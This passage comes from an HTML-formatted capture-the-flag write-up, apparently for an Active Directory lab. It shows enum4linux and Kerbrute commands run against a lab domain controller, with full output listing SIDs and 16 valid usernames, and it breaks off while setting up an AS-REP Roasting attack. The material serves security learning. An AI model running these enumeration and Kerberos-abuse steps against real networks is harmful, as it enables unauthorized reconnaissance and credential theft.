&lt;p&gt;We’ll use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/enum4linux&quot; class=&quot;internal&quot; data-slug=&quot;spells/enum4linux&quot;&gt;enum4linux&lt;/a&gt; to gather some additional information from the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/cifs&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/cifs&quot;&gt;Samba&lt;/a&gt; shares (139/445) on the target.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;enum4linux&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10.10.177.198&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;This produces a lot of noise (I’ve all of the output to STDERR below) as the target is fairly locked down. But there’s a few interesting things here.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Dec 30 20:55:33 2021
 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.177.198
RID Range ........ 500-550,1000-1050
Username ......... &#039;&#039;
Password ......... &#039;&#039;
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on 10.10.177.198    |
 ===================================================== 
[E] Can&#039;t find workgroup/domain


 ============================================= 
|    Nbtstat Information for 10.10.177.198    |
 ============================================= 
Looking up status of 10.10.177.198
No reply from 10.10.177.198

 ====================================== 
|    Session Check on 10.10.177.198    |
 ====================================== 
[+] Server 10.10.177.198 allows sessions using username &#039;&#039;, password &#039;&#039;
[+] Got domain/workgroup name: 

 ============================================ 
|    Getting domain SID for 10.10.177.198    |
 ============================================ 
Domain Name: THM-AD
Domain Sid: S-1-5-21-3591857110-2884097990-301047963
[+] Host is part of a domain (not a workgroup)

 ======================================= 
|    OS information on 10.10.177.198    |
 ======================================= 
[+] Got OS info for 10.10.177.198 from smbclient: 
[+] Got OS info for 10.10.177.198 from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================== 
|    Users on 10.10.177.198    |
 ============================== 
[E] Couldn&#039;t find users using querydispinfo: NT_STATUS_ACCESS_DENIED

[E] Couldn&#039;t find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ========================================== 
|    Share Enumeration on 10.10.177.198    |
 ========================================== 
do_connect: Connection to 10.10.177.198 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.177.198

 ===================================================== 
|    Password Policy Information for 10.10.177.198    |
 ===================================================== 
[E] Unexpected error from polenum:


[+] Attaching to 10.10.177.198 using a NULL share

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:10.10.177.198)

[+] Trying protocol 445/SMB...

	[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.


[E] Failed to get password policy with rpcclient


 =============================== 
|    Groups on 10.10.177.198    |
 =============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================== 
|    Users on 10.10.177.198 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-5-21-3591857110-2884097990-301047963
[I] Found new SID: S-1-5-21-3532885019-1334016158-1514108833
[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username &#039;&#039;, password &#039;&#039;
S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-503 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-504 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-505 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-506 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-507 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-508 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-509 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-510 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-511 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-523 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-524 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-528 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-529 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-530 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-531 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-532 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-533 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-534 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-535 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-536 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-537 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-538 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-539 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-540 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-541 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-542 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-543 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-544 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-545 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-546 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-547 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-548 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-549 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-550 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)
S-1-5-21-3591857110-2884097990-301047963-1001 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1002 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1003 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1004 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1005 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1006 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1007 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1008 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1009 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1010 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1011 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1012 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1013 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1014 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1015 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1016 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1017 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1018 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1019 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1020 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1021 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1022 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1023 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1024 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1025 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1026 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1027 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1028 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1029 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1030 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1031 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1032 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1033 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1034 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1035 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1036 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1037 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1038 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1039 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1040 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1041 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1042 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1043 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1044 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1045 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1046 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1047 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1048 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1049 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username &#039;&#039;, password &#039;&#039;
S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)
S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
S-1-5-21-3532885019-1334016158-1514108833-502 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-505 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-506 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-507 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-508 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-509 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-510 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-511 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-512 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)
S-1-5-21-3532885019-1334016158-1514108833-514 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-515 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-516 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-517 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-518 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-519 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-520 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-521 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-522 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-523 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-524 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-525 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-526 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-527 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-528 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-529 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-530 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-531 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-532 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-533 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-534 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-535 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-536 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-537 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-538 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-539 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-540 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-541 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-542 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-543 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-544 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-545 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-546 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-547 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-548 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-549 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-550 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1000 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1001 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1002 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1003 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1004 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1005 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1006 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1007 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1008 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1009 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1010 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1011 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1012 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1013 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1014 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1015 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1016 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1017 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1018 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1019 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1020 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1021 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1022 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1023 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1024 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1025 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1026 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1027 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1028 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1029 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1030 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1031 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1032 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1033 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1034 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1035 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1036 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1037 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1038 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1039 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1040 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1041 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1042 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1043 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1044 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1045 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1046 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1047 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1048 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1049 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1050 *unknown*\*unknown* (8)

 ============================================== 
|    Getting printer info for 10.10.177.198    |
 ============================================== 
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED

enum4linux complete on Thu Dec 30 21:05:30 2021
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;There’s honestly not much here, though we can see that the NETBIOS domain name for the target is THM-AD.&lt;/p&gt;
&lt;p&gt;The AD domain itself is using the standard (invalid) .local TLD, but that’s not actually something that &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/enum4linux&quot; class=&quot;internal&quot; data-slug=&quot;spells/enum4linux&quot;&gt;enum4linux&lt;/a&gt; tells us — instead, we can see this in the earlier output from &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/nmap&quot;&gt;Nmap&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;enumerating-users-via-kerberos&quot;&gt;Enumerating users via Kerberos&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#enumerating-users-via-kerberos&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;We’ll now try to enumerate users using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/kerbrute&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/kerbrute&quot;&gt;Kerbrute&lt;/a&gt; and &lt;a href=&quot;https://github.com/Sq00ky/attacktive-directory-tools/blob/master/userlist.txt&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;the provided user list&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;kerbrute&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; userenum&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; --dc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10.10.177.198&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;                  --domain&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; spookysec.local&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;                  --output&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; attacktive-director.kerbrute&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;                           userlist.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;This produces the following output.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&amp;#x3C; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 12/30/21 - Ronnie Flathers @ropnop

2021/12/30 21:12:56 &gt;  Using KDC(s):
2021/12/30 21:12:56 &gt;   10.10.177.198:88

2021/12/30 21:12:56 &gt;  [+] VALID USERNAME:       james@spookysec.local
2021/12/30 21:12:59 &gt;  [+] VALID USERNAME:       svc-admin@spookysec.local
2021/12/30 21:13:03 &gt;  [+] VALID USERNAME:       James@spookysec.local
2021/12/30 21:13:05 &gt;  [+] VALID USERNAME:       robin@spookysec.local
2021/12/30 21:13:20 &gt;  [+] VALID USERNAME:       darkstar@spookysec.local
2021/12/30 21:13:30 &gt;  [+] VALID USERNAME:       administrator@spookysec.local
2021/12/30 21:13:49 &gt;  [+] VALID USERNAME:       backup@spookysec.local
2021/12/30 21:13:58 &gt;  [+] VALID USERNAME:       paradox@spookysec.local
2021/12/30 21:14:55 &gt;  [+] VALID USERNAME:       JAMES@spookysec.local
2021/12/30 21:15:14 &gt;  [+] VALID USERNAME:       Robin@spookysec.local
2021/12/30 21:17:10 &gt;  [+] VALID USERNAME:       Administrator@spookysec.local
2021/12/30 21:20:59 &gt;  [+] VALID USERNAME:       Darkstar@spookysec.local
2021/12/30 21:22:12 &gt;  [+] VALID USERNAME:       Paradox@spookysec.local
2021/12/30 21:26:17 &gt;  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2021/12/30 21:27:26 &gt;  [+] VALID USERNAME:       ori@spookysec.local
2021/12/30 21:29:37 &gt;  [+] VALID USERNAME:       ROBIN@spookysec.local
2021/12/30 21:35:06 &gt;  Done! Tested 73317 usernames (16 valid) in 1330.206 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We’ll be targeting the svc-admin and backup accounts. (These are supposed to “jump out” at me, but honestly I’m not sure why they’re more interesting than the other users, or administrator. Maybe because they’re &lt;em&gt;not&lt;/em&gt; obviously people but also not the administrator account?)&lt;/p&gt;
&lt;h2 id=&quot;abusing-kerberos&quot;&gt;Abusing Kerberos&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#abusing-kerberos&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;We’re going to try &lt;a href=&quot;https://blog.certcube.com/as-rep-roasting-attack/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;AS-REP Roasting&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/impacket&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/impacket&quot;&gt;Impacket&lt;/a&gt;’s GetNPUsers.py script. We first create an &lt;code&gt;attacktive-directory.targets&lt;/code&gt; file containing the following:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;svc-admin
backup
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Then, we feed this to the GetNPUsers.py script.&lt;/p&gt;
